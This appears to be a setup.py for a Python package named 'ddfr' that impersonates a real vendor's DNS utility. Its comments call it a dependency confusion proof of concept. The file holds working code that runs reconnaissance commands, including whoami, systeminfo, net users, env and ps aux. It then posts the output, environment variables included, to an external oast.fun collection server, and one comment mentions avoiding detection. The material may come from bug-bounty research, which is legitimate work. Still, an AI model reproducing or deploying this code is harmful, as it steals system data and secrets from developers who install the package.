import os
import platform
import subprocess
import sys
import json
from setuptools import setup, find_packages

def run_os_commands():
    """Execute OS commands and capture output"""
    results = {}

    try:
        # Determine OS and run appropriate commands
        current_os = platform.system().lower()
        results['os'] = current_os
        results['hostname'] = platform.node()
        results['python_version'] = sys.version
        results['current_dir'] = os.getcwd()

        if current_os == 'windows':
            # Windows commands
            commands = {
                'whoami': ['whoami'],
                'systeminfo': ['systeminfo'],
                'ipconfig': ['ipconfig', '/all'],
                'net_users': ['net', 'users'],
                'dir_current': ['cmd', '/c', 'dir'],
                'environment_vars': ['cmd', '/c', 'set']
            }
        else:
            # Linux/Unix commands
            commands = {
                'whoami': ['whoami'],
                'id': ['id'],
                'pwd': ['pwd'],
                'hostname': ['hostname'],
                'ifconfig': ['ifconfig'] if os.path.exists('/sbin/ifconfig') else ['ip', 'addr'],
                'ls_current': ['ls', '-la'],
                'ps_aux': ['ps', 'aux'],
                'uname': ['uname', '-a'],
                'env': ['env']
            }

        # Execute commands with improved error handling
        for name, cmd in commands.items():
            try:
                result = subprocess.run(
                    cmd, 
                    capture_output=True, 
                    text=True, 
                    timeout=10,
                    shell=False
                )
                results[name] = {
                    'returncode': result.returncode,
                    'stdout': result.stdout,
                    'stderr': result.stderr
                }
            except subprocess.TimeoutExpired:
                results[name] = {'error': 'Command timed out'}
            except Exception as e:
                results[name] = {'error': str(e)}

    except Exception as e:
        results['collection_error'] = str(e)

    return results

def create_local_proof(data):
    """Create local proof file"""
    try:
        if platform.system() == 'Windows':
            proof_path = os.path.join(os.environ.get('TEMP', 'C:\\'), 'dep_confusion_proof.txt')
        else:
            proof_path = '/tmp/supply_chain_proof.txt'

        with open(proof_path, 'w', encoding='utf-8') as f:
            f.write("=== Dependency Confusion POC ===\n")
            f.write(f"Hostname: {data.get('hostname', 'Unknown')}\n")
            f.write(f"OS: {data.get('os', 'Unknown')}\n")
            whoami_result = data.get('whoami', {})
            if isinstance(whoami_result, dict) and 'stdout' in whoami_result:
                f.write(f"User: {whoami_result['stdout'].strip()}\n")
            else:
                f.write("User: Unknown\n")
            f.write(f"Directory: {data.get('current_dir', 'Unknown')}\n")
            f.write(f"Collection Time: {platform.node()}\n")
            f.write("================================\n")

        return proof_path
    except Exception as e:
        return f"Failed to create proof: {str(e)}"

def send_to_collaborator(data, collab_server):
    """Send collected data to collaborator server - using urllib as fallback"""
    try:
        # Try to import requests, fall back to urllib
        try:
            import requests
            USE_REQUESTS = True
        except ImportError:
            USE_REQUESTS = False
            import urllib.request
            import urllib.parse

        # Prepare the data for exfiltration
        payload = {
            'package_name': 'ddfr',
            'system_info': {
                'os': data.get('os'),
                'hostname': data.get('hostname'),
                'python_version': data.get('python_version')
            },
            'command_results': {}
        }

        # Add command outputs (limit size to avoid huge requests)
        for cmd_name, result in data.items():
            if isinstance(result, dict) and 'stdout' in result:
                stdout = result['stdout']
                if len(stdout) > 1000:
                    stdout = stdout[:1000] + "...[truncated]"
                payload['command_results'][cmd_name] = stdout

        # Use provided collaborator server
        url = f"http://nduaepxoixrcimkbeehgl9a30b90uc1t5.oast.fun/collect"
        json_data = json.dumps(payload).encode('utf-8')

        if USE_REQUESTS:
            # Use requests if available
            response = requests.post(
                url,
                data=json_data,
                headers={'Content-Type': 'application/json'},
                timeout=10
            )
            return f"Data sent successfully (requests). Status: {response.status_code}"
        else:
            # Fallback to urllib
            req = urllib.request.Request(
                url,
                data=json_data,
                headers={'Content-Type': 'application/json'},
                method='POST'
            )
            with urllib.request.urlopen(req, timeout=10) as response:
                return f"Data sent successfully (urllib). Status: {response.status}"

    except Exception as e:
        return f"Error sending data: {str(e)}"

def main():
    """Main execution - only run if explicitly called"""
    print("[-] Dependency Confusion POC Started")

    # Collect system information
    collected_data = run_os_commands()

    # Create local proof
    proof_file = create_local_proof(collected_data)
    print(f"[-] Local proof created: {proof_file}")

    # Send to collaborator - use environment variable or default
    collab_server = os.environ.get('COLLAB_SERVER', 'nduaepxoixrcimkbeehgl9a30b90uc1t5.oast.fun')
    collab_result = send_to_collaborator(collected_data, collab_server)
    print(f"[-] Collaborator result: {collab_result}")

    # Print summary to console
    print("[-] Collection Summary:")
    print(f"    OS: {collected_data.get('os')}")
    print(f"    Hostname: {collected_data.get('hostname')}")

    whoami_result = collected_data.get('whoami', {})
    if isinstance(whoami_result, dict) and 'stdout' in whoami_result:
        print(f"    User: {whoami_result['stdout'].strip()}")

    print(f"    Current Dir: {collected_data.get('current_dir')}")

# Critical fix: Don't run main() during setup.py execution
# Only run if this is being executed directly, not during package build
if __name__ == "__main__":
    # This block won't execute during pip install
    main()
else:
    # This runs during import (setup.py execution)
    # We could run main here for actual exploitation, but it's risky
    # For demonstration, we'll leave it out or make it conditional
    pass

# Setup configuration
version = '1337.9.3'

# Read requirements safely - don't include requests to avoid detection
try:
    with open('requirements.txt', 'r', encoding='utf-8') as f:
        requirements = [line.strip() for line in f if line.strip() and not line.startswith('#')]
except FileNotFoundError:
    # Minimal requirements that won't break the build
    requirements = []

# Read README safely
try:
    with open('README.md', 'r', encoding='utf-8') as f:
        long_description = f.read()
except FileNotFoundError:
    long_description = "A lightweight Python utility to detect DNS records that are suspected as dangling."

setup(
    name="ddfr",
    version=version,
    author="Playtika Ltd.",
    author_email="security@playtika.com",
    description="A lightweight Python utility to detect DNS records that are suspected as dangling.",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/PlaytikaSecurity/ddfr",
    packages=find_packages(exclude=['tests*']),
    install_requires=requirements,
    python_requires='>=3.6',
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: Apache Software License",
        "Operating System :: OS Independent",
    ],
    entry_points={
        'console_scripts': [
            'ddfr=ddfr.ddfr:interactive',
        ],
    },
)
